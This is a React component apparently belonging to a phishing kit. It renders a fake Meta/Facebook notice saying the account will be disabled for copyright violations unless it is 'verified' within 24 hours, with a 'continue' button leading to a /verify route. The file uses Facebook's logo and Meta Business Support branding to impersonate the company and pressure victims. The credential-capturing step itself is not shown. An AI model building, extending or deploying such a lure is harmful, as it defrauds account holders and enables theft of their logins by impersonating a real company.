import React from 'react';
import './Fbpage.css';
import { Link } from 'react-router-dom';

function Fbpage() {
    const headerStyle = {
        background: '#fff',
        borderBottom: '.5px solid rgba(0, 0, 0, .15)',
    };

    const buttonStyle = {
        background: 'rgb(26, 115, 232)',
        width: '100%',
        fontSize: '16px',
        lineHeight: '0px',
        borderRadius: '5px',
        cursor: 'pointer',
    };

    return (
        <>
            <div className="welcome">
                <header className="header-section" style={headerStyle}>
                    <div className="header-container">
                        <div className="w-25">
                            <div className="logo-area">
                                <svg viewBox="0 0 36 36" className="k0f0a27 _a4pc" fill="currentColor" height="40" width="40" aria-label="Logo">
                                    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
                                    <path className="q61vvz9" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
                                </svg>
                            </div>
                        </div>
                    </div>
                </header>
                <div className="body mb-5">
                    <div className="form-wrapper">
                        <h3>Account will be deactivated</h3>
                        <div className="blok1">
                            Your account or the page you use has violated copyright. We will immediately limit your account or permanently disable it for non-compliance with our terms of service.
                        </div>
                        <div className="blok1">
                            If you think we've accidentally suspended your account, you have <b>24 hours</b> to verify your account. If you miss this security notification, your account will be permanently disabled.
                        </div>
                        <div className="select-issue">
                            <div className="form-check mb-3">
                                <table border="0" cellSpacing="0" cellPadding="0" style={{ borderCollapse: 'collapse' }}>
                                    <tbody>
                                        <tr>
                                            <td valign="top">
                                                <a href="https://www.facebook.com/metasupportpros" style={{ color: '#1b74e4', textDecoration: 'none' }}>
                                                    <img 
                                                        width="64" 
                                                        src="TbXLmqW3Z.png" 
                                                        alt="Meta Business Support" 
                                                        style={{ border: 'solid 1px rgba(0,0,0,0.15)', borderRadius: '50%' }} 
                                                    />
                                                </a>
                                            </td>
                                            <td>
                                                <div className="Tex5">Meta Business Support</div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                            <div className="Tex3">We will walk you through several steps to cancel a deactivated account.</div>
                            <div className="justify-content-end w-full">
                                <Link className="btn btn-lg btn-primary" to="/verify" style={buttonStyle}>
                                    continue
                                </Link>
                            </div>
                        </div>
                    </div>
                    <div className="mEtcORP">Meta © 2024</div>
                </div>
            </div>
        </>
    );
}

export default Fbpage;
